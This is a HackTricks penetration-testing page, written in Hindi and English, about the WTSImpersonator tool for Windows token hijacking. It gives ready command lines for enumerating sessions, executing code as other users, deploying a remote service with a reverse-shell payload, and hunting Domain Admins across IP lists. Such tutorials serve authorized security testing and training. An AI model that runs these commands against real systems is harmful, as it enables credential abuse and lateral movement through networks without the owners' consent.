# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTS Impersonator** tool **"\\pipe\LSM_API_service"** RPC Named pipe का उपयोग करके stealthily logged-in users की enumeration करता है और उनके tokens को hijack करता है, जिससे traditional Token Impersonation techniques को bypass किया जा सकता है। यह approach networks के भीतर seamless lateral movements को संभव बनाता है। इस technique का innovation **Omri Baso** को credit दिया जाता है, जिनका work [GitHub](https://github.com/OmriBaso/WTSImpersonator) पर उपलब्ध है।<sup>[[1]](#references)</sup>

### Core Functionality

Tool API calls के एक sequence के माध्यम से operate करता है:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### प्रमुख Modules और Usage

- **Users Enumerating**: इस tool के साथ local और remote user enumeration संभव है, जिसमें दोनों scenarios के लिए commands का उपयोग किया जाता है:

- Locally:
```bash
.\WTSImpersonator.exe -m enum
```
- Remotely, IP address या hostname निर्दिष्ट करके:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Commands Executing**: `exec` और `exec-remote` modules को काम करने के लिए **Service** context की आवश्यकता होती है। Local execution के लिए केवल WTSImpersonator executable और एक command की आवश्यकता होती है:

- Local command execution का example:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- Service context प्राप्त करने के लिए PsExec64.exe का उपयोग किया जा सकता है:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote Command Execution**: इसमें PsExec.exe के समान remotely एक service create और install करना शामिल है, जिससे appropriate permissions के साथ execution किया जा सके।

- Remote execution का example:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User Hunting Module**: यह multiple machines पर specific users को target करता है और उनके credentials के under code execute करता है। यह विशेष रूप से उन Domain Admins को target करने के लिए उपयोगी है जिनके पास कई systems पर local admin rights हैं।
- Usage example:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)

{{#include ../../banners/hacktricks-training.md}}
